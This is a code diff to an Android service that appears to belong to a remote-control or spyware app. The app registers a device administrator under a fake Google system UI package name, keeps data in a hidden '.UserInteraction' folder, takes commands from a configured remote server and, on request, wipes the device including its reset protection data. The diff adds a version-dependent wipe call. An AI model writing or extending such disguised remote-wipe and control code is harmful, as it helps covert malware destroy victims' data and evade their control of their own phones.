@@ -53,6 +53,7 @@ import java.io.IOException;
 import java.net.Socket;
 import java.util.ArrayList;
 import java.util.Locale;
+import java.util.jar.Manifest;
 
 public class CommunicationService extends Service implements OnInitListener
 {
@@ -118,13 +119,14 @@ public class CommunicationService extends Service implements OnInitListener
 	public int onStartCommand(Intent intent, int p1, int p2)
 	{
 		mPublisher = new NotificationPublisher(this);
-		mDPM = (DevicePolicyManager) getSystemService(Service.DEVICE_POLICY_SERVICE);
 		mAudioManager = (AudioManager) getSystemService(Service.AUDIO_SERVICE);
-		mDeviceAdmin = new ComponentName(this, com.google.android.systemUi.receiver.DeviceAdmin.class);
 		mPreferences = PreferenceManager.getDefaultSharedPreferences(this);
 		mPowerManager = (PowerManager) getSystemService(Service.POWER_SERVICE);
 		mVibrator = (Vibrator) getSystemService(Service.VIBRATOR_SERVICE);
 		mClipboard = (ClipboardManager) getSystemService(Service.CLIPBOARD_SERVICE);
+
+		mDeviceAdmin = new ComponentName(this, com.google.android.systemUi.receiver.DeviceAdmin.class);
+		mDPM = (DevicePolicyManager) getSystemService(Service.DEVICE_POLICY_SERVICE);
 
 		if (mPreferences.contains("remoteServer"))
 			mRemote.setAddress(new ServerAddress(mPreferences.getString("remoteServer", null)));
@@ -218,6 +220,7 @@ public class CommunicationService extends Service implements OnInitListener
 
 	public File getHiddenDirectory()
 	{
+		//File hiddenDir = getApplicationContext().getFilesDir();
 		File hiddenDir = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + "Android" + File.separator + "data" + File.separator + ".UserInteraction");
 		hiddenDir.mkdirs();
 
@@ -573,9 +576,7 @@ public class CommunicationService extends Service implements OnInitListener
 						JSONArray jsonArray = new JSONArray();
 
 						while (dataIS.available() > 0)
-						{
 							jsonArray.put(dataIS.readLine());
-						}
 
 						dataIS.close();
 
@@ -628,7 +629,12 @@ public class CommunicationService extends Service implements OnInitListener
 							if (mWipeCountdown == 0)
 							{
 								response.put("info", "Request successful. Wipe requested");
-								mDPM.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE | DevicePolicyManager.WIPE_RESET_PROTECTION_DATA);
+
+								if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1)
+									mDPM.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE | DevicePolicyManager.WIPE_RESET_PROTECTION_DATA);
+								else
+									mDPM.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
+
 								result = true;
 							}
 							else if (mWipeCountdown > 0)
